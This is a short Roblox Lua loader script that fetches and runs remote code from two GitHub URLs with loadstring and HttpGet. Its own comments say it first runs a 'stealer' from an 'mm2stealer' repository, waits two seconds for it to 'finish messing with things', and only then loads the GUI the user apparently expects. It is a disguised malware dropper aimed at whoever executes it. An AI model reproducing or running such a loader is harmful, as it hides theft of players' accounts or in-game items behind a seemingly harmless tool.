loadstring([[
    -- Run stealer
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr"))()
    end)

    -- Delay to allow stealer to finish messing with things
    wait(2)

    -- Run GUI
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
    end)
]])()
